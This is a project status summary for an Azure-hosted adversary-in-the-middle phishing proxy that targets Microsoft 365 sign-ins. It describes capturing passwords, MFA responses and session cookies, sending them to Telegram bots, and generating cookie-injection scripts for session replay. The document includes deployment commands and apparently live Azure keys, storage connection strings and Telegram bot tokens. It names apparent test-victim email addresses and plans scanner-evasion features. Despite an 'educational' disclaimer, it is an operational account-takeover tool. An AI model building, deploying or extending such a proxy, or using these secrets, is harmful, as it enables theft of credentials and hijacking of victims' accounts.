# Azure AiTM Phishing Function - Comprehensive Summary

## Project Overview
This is an **Adversary-in-the-Middle (AiTM) phishing proxy** implemented as an Azure Function. The project creates a sophisticated reverse proxy that intercepts Microsoft 365 authentication flows to capture **session tokens** for post-authentication access, bypassing Multi-Factor Authentication (MFA).

### What This Project Does
1. **Reverse Proxy**: Acts as a transparent intermediary between victims and Microsoft's legitimate authentication servers
2. **Session Hijacking**: Captures post-authentication session tokens instead of just credentials
3. **MFA Bypass**: Renders phishable MFA methods (SMS, TOTP, push notifications) obsolete
4. **Real-time Interception**: Intercepts the entire authentication exchange in real-time
5. **Account Type Detection**: Automatically routes corporate vs personal accounts to correct endpoints

### Attack Methodology
- **Lure**: Victim clicks phishing link pointing to our proxy domain
- **Proxy**: Our Azure Function transparently relays traffic to Microsoft
- **Interception**: Captures username, password, and MFA response
- **Session Capture**: Intercepts the session token issued by Microsoft
- **Token Replay**: Attacker injects stolen token into their browser for full access
- **Persistence**: Establishes long-term access before token expiration

## Current Status
**DEPLOYED BUT NOT FULLY FUNCTIONAL**

### What Works
- ✅ Corporate account detection and routing to `login.microsoftonline.com`
- ✅ Basic credential capture (email/password)
- ✅ **Session cookie capture for corporate accounts** - Captures critical authentication tokens
- ✅ **Telegram notifications for captured data** - Real-time attack monitoring
- ✅ **Basic reverse proxy functionality** - Transparent traffic relay
- ✅ **Cookie injection script generation** - Creates scripts to replay stolen sessions

### What Doesn't Work
- ❌ **Personal account flow** - redirects to real `login.live.com` instead of staying proxied
- ❌ **Personal account OAuth flow handling** - Can't intercept personal account authentication
- ❌ **Recovery email verification for personal accounts** - MFA bypass incomplete
- ❌ **Password validation for personal accounts** - Authentication flow broken
- ❌ **Advanced evasion techniques** - No bot detection or scanner blocking
- ❌ **Federation support** - Can't handle ADFS or other federated authentication

## Azure Resources & Credentials

### Azure Subscription
- **Subscription ID**: `4e748793-333d-4c5e-acc4-7ce3fa17b136`
- **Tenant ID**: `f544b97b-dab1-4bae-8114-c7dd29990284`
- **Subscription Name**: "Azure subscription 1"
- **Environment**: AzureCloud

### Service Principal Credentials (AUTO-LOGIN)
- **App ID**: `ef46029c-6f68-4cf7-a971-1a892452b956`
- **Display Name**: `aitm-test-1753290092`
- **Object ID**: `a463559a-0f89-45e2-bf7f-f45d6e5cd047`
- **Type**: Service Principal
- **Login Command**: `az login --service-principal -u ef46029c-6f68-4cf7-a971-1a892452b956 --tenant f544b97b-dab1-4bae-8114-c7dd29990284`

### Function App Details
- **Function App Name**: `azureaitm-phishing-demo-1755253259`
- **Resource Group**: `AzureAiTM-ResourceGroup`
- **Location**: East US
- **URL**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net`
- **Runtime**: Node.js 22
- **Plan**: EastUSLinuxDynamicPlan (Consumption)

### Outbound IP Addresses
```
40.88.241.29,52.146.29.58,40.88.241.213,40.88.242.116,40.88.242.219,40.88.243.53,20.49.104.34
```

### Publishing Credentials
- **FTP URL**: `ftps://waws-prod-blu-249.ftp.azurewebsites.windows.net/site/wwwroot`
- **Username**: `$azureaitm-phishing-demo-1755253259`

### Function App Keys (API ACCESS)
- **Master Key**: `Go64twSWFJO3nd0UiEG2kWOd5CwSqFF75ElglelXNZFJAzFuSEg6FA==`
- **Function Key**: `44pyG40DaS9m0SmxglPxNPRs7E5zL5rNXXH3nyBqP7pTAzFuLp1sqA==`

### Storage Account Credentials
- **Account Name**: `azureaitmstorage123`
- **Account Key**: `1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==`
- **Connection String**: `DefaultEndpointsProtocol=https;EndpointSuffix=core.windows.net;AccountName=azureaitmstorage123;AccountKey=1i5QIqZ7bjFsADye+9kKsqhVm7L/fAq6WFYBMi/qglphsTsTq1DWh0ZydqQfMx2OoetoIaJENytJ+AStLN/XoA==`

### Application Insights
- **Instrumentation Key**: `e71a0bb1-de29-42e7-8712-856d27c3e019`
- **Connection String**: `InstrumentationKey=e71a0bb1-de29-42e7-8712-856d27c3e019;IngestionEndpoint=https://eastus-8.in.applicationinsights.azure.com/;LiveEndpoint=https://eastus.livediagnostics.monitor.azure.com/;ApplicationId=02e3e413-7d4b-4ba9-bded-27af24eab88b`

## Telegram Bot Configuration

### Bot 1 (Primary)
- **Token**: `7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps`
- **Chat ID**: `6743632244`
- **Status**: Configured but may need chat_id verification

### Bot 2 (Backup)
- **Token**: `7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U`
- **Chat ID**: `6263177378`
- **Status**: Working

## Deployment Instructions

### Prerequisites
1. Azure CLI installed and authenticated
2. Node.js 18+ installed
3. Azure Functions Core Tools installed

### Initial Setup
```bash
# Clone the repository
git clone <repository-url>
cd AzureAiTMFunction-main

# Install dependencies
npm install

# Login to Azure (AUTOMATIC)
az login --service-principal -u ef46029c-6f68-4cf7-a971-1a892452b956 --tenant f544b97b-dab1-4bae-8114-c7dd29990284

# Set subscription
az account set --subscription 4e748793-333d-4c5e-acc4-7ce3fa17b136
```

### Deploy to Azure
```bash
# Deploy the function app
func azure functionapp publish azureaitm-phishing-demo-1755253259

# Verify deployment
az functionapp show --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup
```

### Access the Function
- **Main URL**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/`
- **Phishing Function**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/{*x}`
- **API Access**: `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/api/phishing?code=44pyG40DaS9m0SmxglPxNPRs7E5zL5rNXXH3nyBqP7pTAzFuLp1sqA==`

## Technical Architecture

### Core Components
1. **Main Handler**: `src/functions/phishing.js`
2. **Account Detection**: Separate logic for corporate vs personal accounts
3. **Response Modification**: Dynamic URL rewriting and JavaScript injection
4. **Credential Capture**: POST request parsing for login data
5. **Cookie Capture**: Session token extraction and modification
6. **Telegram Integration**: Real-time notifications

### Key Functions
- `isPersonalEmail()`: Detects personal account emails
- `replace_response_text()`: Corporate account response handling
- `replace_response_text_personal()`: Personal account response handling
- `generateCookieInjectionScript()`: Creates cookie injection scripts
- `dispatchMessage()`: Sends Telegram notifications

## Session Token & Cookie Capture

### Critical Authentication Cookies Captured
The proxy specifically targets these Microsoft authentication cookies:

#### Corporate Account Cookies (`login.microsoftonline.com`)
- **ESTSAUTH**: Primary session authentication token
- **ESTSAUTHPERSISTENT**: Long-term persistent session token
- **ESTSAUTHLIGHT**: Session state management token
- **SignInStateCookie**: Sign-in state and flow management

#### Personal Account Cookies (`login.live.com`)
- **RPSSecAuth**: Personal account security authentication
- **WLSSC**: Windows Live session state cookie
- **SignInStateCookie**: Personal account sign-in state

### Cookie Injection Scripts
When 3+ critical cookies are captured, the system generates **cookie injection scripts** that:
1. **Parse captured cookies** into browser-compatible format
2. **Set domain-specific cookies** (login.microsoftonline.com or login.live.com)
3. **Redirect to legitimate domain** for session replay
4. **Bypass MFA** by using stolen session tokens

### Session Token Value
These cookies contain **cryptographic session tokens** that:
- **Prove authentication** to Microsoft services
- **Bypass MFA requirements** completely
- **Grant full account access** without credentials
- **Enable persistent access** until token expiration
- **Allow API access** to Microsoft 365 services

## Issues Encountered & Attempted Fixes

### Issue 1: Personal Account Redirect Problem
**Problem**: Personal accounts redirect to real `login.live.com` instead of staying proxied

**Attempted Fixes**:
1. ✅ Added personal account detection (`@outlook.com`, `@hotmail.com`, etc.)
2. ✅ Implemented separate routing to `login.live.com`
3. ✅ Created separate response handlers for personal accounts
4. ✅ Added aggressive URL rewriting for personal accounts
5. ❌ **STILL NOT WORKING** - Personal accounts still redirect to real domain

### Issue 2: Corporate Account Interference
**Problem**: Personal account fixes were breaking corporate account functionality

**Solution**: ✅ Implemented completely separate logic paths that don't interfere

### Issue 3: JavaScript Errors
**Problem**: `TypeError: Cannot redefine property: top` errors in browser console

**Solution**: ✅ Removed problematic `Object.defineProperty` calls

### Issue 4: Session Context Loss
**Problem**: `AADSTS165000: Invalid Request: The user session context is missing`

**Solution**: ✅ Removed `"Set-Cookie"` from delete_headers array

### Issue 5: URL Malformation
**Problem**: Double domain URLs like `azurewebsites.net/azurewebsites.net/`

**Solution**: ✅ Fixed pathname construction logic

## Research Implementation Status

### From "The Primacy of Session Hijacking" Research Paper

#### ✅ Implemented
- Basic reverse proxy functionality
- Dynamic upstream routing (corporate vs personal)
- Credential and cookie capture
- Real-time Telegram notifications
- Separate response handlers for different account types

#### ❌ Not Implemented
- **Dynamic Host Proxying**: Can't handle ADFS redirects
- **Advanced JavaScript Modification**: Limited DOM manipulation
- **Client Fingerprinting**: No bot detection
- **Statelessness**: Uses in-memory emailMap (not scalable)
- **Configuration-Driven Behavior**: Hardcoded domains
- **Advanced Evasion**: No scanner blocking

## Current Code Structure

### Main Handler (`phishing.js`)
```javascript
// Account detection
function isPersonalEmail(email) { ... }

// Separate response handlers
async function replace_response_text() { ... }        // Corporate
async function replace_response_text_personal() { ... } // Personal

// Main handler with separate logic paths
app.http("phishing", { ... })
```

### Key Features
- **Corporate accounts**: Routes to `login.microsoftonline.com`
- **Personal accounts**: Routes to `login.live.com`
- **Separate JavaScript injection**: Different handlers for each account type
- **Cookie domain handling**: Correct domains for each account type
- **Telegram notifications**: Real-time updates

## Phishing Attack Flow

### Complete Attack Chain
1. **Lure Creation**: Phishing email with link to `https://azureaitm-phishing-demo-1755253259.azurewebsites.net/`
2. **Victim Click**: User clicks link, thinking it's legitimate Microsoft login
3. **Proxy Interception**: Our Azure Function intercepts the request
4. **Account Detection**: System detects corporate vs personal account type
5. **Upstream Routing**: Routes to appropriate Microsoft domain (login.microsoftonline.com or login.live.com)
6. **Credential Capture**: Intercepts username/password during login
7. **MFA Interception**: Captures MFA response (SMS code, TOTP, push approval)
8. **Session Token Capture**: Intercepts the session token issued by Microsoft
9. **Real-time Notification**: Sends captured data to Telegram
10. **Cookie Injection**: Generates script to replay stolen session
11. **Session Replay**: Attacker uses stolen token for full account access

### Real-time Monitoring
- **Telegram Bot 1**: `7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps`
- **Telegram Bot 2**: `7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U`
- **Notifications**: Email entry, credential capture, session token capture, cookie injection scripts

## Testing Results

### Corporate Accounts (WORKING)
- ✅ Email detection: `zoe@alss.net.au`
- ✅ Routing to `login.microsoftonline.com`
- ✅ Credential capture
- ✅ **Session cookie capture** - ESTSAUTH, ESTSAUTHPERSISTENT, ESTSAUTHLIGHT, SignInStateCookie
- ✅ **Cookie injection script generation** - Creates executable scripts for session replay

### Personal Accounts (BROKEN)
- ✅ Email detection: `babayaga20008@outlook.com`
- ✅ Routing to `login.live.com`
- ❌ **FAILS**: Redirects to real `login.live.com` - breaks proxy chain
- ❌ **FAILS**: "There was an issue looking up your account" - OAuth flow broken
- ❌ **FAILS**: Password validation errors - authentication fails
- ❌ **FAILS**: Recovery email verification fails - MFA bypass incomplete
- ❌ **FAILS**: No session token capture - can't hijack sessions

## Known Limitations

1. **Statelessness**: Uses in-memory `emailMap` - not scalable
2. **Federation**: No ADFS support
3. **Evasion**: No bot detection or scanner blocking
4. **Personal Accounts**: Core functionality broken
5. **Error Handling**: Limited error recovery
6. **Configuration**: Hardcoded values throughout

## Phishing Techniques & Evasion

### Current Evasion Features
- **URL Rewriting**: Replaces Microsoft domains with proxy domain
- **Header Modification**: Removes security headers (CSP, X-Frame-Options)
- **Cookie Domain Replacement**: Modifies Set-Cookie headers
- **JavaScript Injection**: Injects event capture scripts
- **User-Agent Spoofing**: Uses generic browser user-agent

### Missing Advanced Evasion
- **Bot Detection**: No client fingerprinting or scanner blocking
- **TLS Fingerprinting**: No JA4 fingerprinting for bot detection
- **Dynamic Redirection**: No immediate redirect after session capture
- **Lure Pausing**: No ability to pause lures during email scanning
- **Wildcard Certificates**: No wildcard TLS certificate support
- **Framebuster Defeat**: Limited JavaScript manipulation

### Phishing Indicators
- **Domain**: `azureaitm-phishing-demo-1755253259.azurewebsites.net` (obvious phishing domain)
- **Certificate**: Standard Azure certificate (not wildcard)
- **Headers**: Missing security headers (CSP, X-Frame-Options)
- **JavaScript**: Injected scripts for event capture
- **Telegram Logging**: All activities logged to Telegram bots

## Recommendations for Future Development

### Immediate Fixes Needed
1. **Fix Personal Account Flow**: Implement proper OAuth handling
2. **Add Statelessness**: Use Azure Table Storage or Redis
3. **Improve Error Handling**: Better error recovery mechanisms
4. **Add Bot Detection**: Implement client fingerprinting

### Advanced Features
1. **ADFS Support**: Handle federated authentication
2. **Configuration Files**: Externalize settings
3. **Advanced Evasion**: Scanner blocking and fingerprinting
4. **Monitoring**: Better logging and analytics

## Security Considerations

⚠️ **WARNING**: This is a proof-of-concept for educational purposes only.

- All credentials are hardcoded in the source code
- No encryption of captured data
- No access controls or authentication
- Publicly accessible function app
- Logs all activities to Telegram

## File Structure
```
AzureAiTMFunction-main/
├── src/
│   └── functions/
│       ├── phishing.js          # Main phishing function
│       ├── devicecode_landing.js # Device code flow
│       ├── devicecode_poll.js    # Device code polling
│       ├── execution.js          # Execution function
│       └── logging.js            # Logging function
├── package.json
├── host.json
└── azuredeploy.json
```

## Commands for Management

### View Logs
```bash
# View function app logs
az webapp log tail --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup

# View specific function logs
func azure functionapp logstream azureaitm-phishing-demo-1755253259
```

### Restart Function App
```bash
az functionapp restart --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup
```

### Delete Resources
```bash
# Delete the entire resource group
az group delete --name AzureAiTM-ResourceGroup --yes

# Delete specific function app
az functionapp delete --name azureaitm-phishing-demo-1755253259 --resource-group AzureAiTM-ResourceGroup
```

## Conclusion

The project successfully implements a basic AiTM phishing proxy for corporate Microsoft 365 accounts but fails to handle personal account flows properly. The core issue is that personal accounts redirect to the legitimate `login.live.com` instead of staying on the proxy, which breaks the entire attack chain.

**Current Status**: Corporate accounts work, personal accounts are broken, and the project needs significant improvements to be production-ready.

**Next Steps**: Focus on fixing the personal account OAuth flow, implementing statelessness, and adding advanced evasion techniques from the research paper.
